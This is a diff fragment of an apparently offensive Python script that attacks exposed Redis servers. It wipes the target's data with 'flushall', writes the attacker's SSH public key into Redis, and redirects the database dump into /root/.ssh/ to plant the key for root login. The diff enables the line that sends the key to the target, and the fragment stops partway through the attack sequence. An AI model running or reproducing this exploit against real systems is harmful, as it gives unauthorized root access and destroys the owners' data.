@@ -25,15 +25,15 @@ try:
     print(colored('\t*******************************************************************', "green"))
     print("\n")
     print(colored("\t SSH Keys Need to be Generated", 'blue'))
-    os.system('ssh-keygen -t rsa -C \"acid_creative\"')
-    print(colored("\t Keys Generated Successfully", "blue"))
+    # os.system('ssh-keygen -t rsa -C \"acid_creative\"')
+    # print(colored("\t Keys Generated Successfully", "blue"))
     os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
     cmd = "{} -h ".format(REDIS_CLI) + ip_address + " -p " + port + ' flushall'
     cmd1 = "{} -h ".format(REDIS_CLI) + ip_address + " -p " + port
     os.system(cmd)
     cmd2 = "cat $HOME/.ssh/public_key.txt | {} -h ".format(
         REDIS_CLI) + ip_address + " -p " + port + ' -x set cracklist'
-    # os.system(cmd2)
+    os.system(cmd2)
     cmd3 = cmd1 + ' config set dbfilename "backup.db" '
     if username == "root":
         cmd4 = cmd1 + ' config set  dir' + " /root" + "/.ssh/"
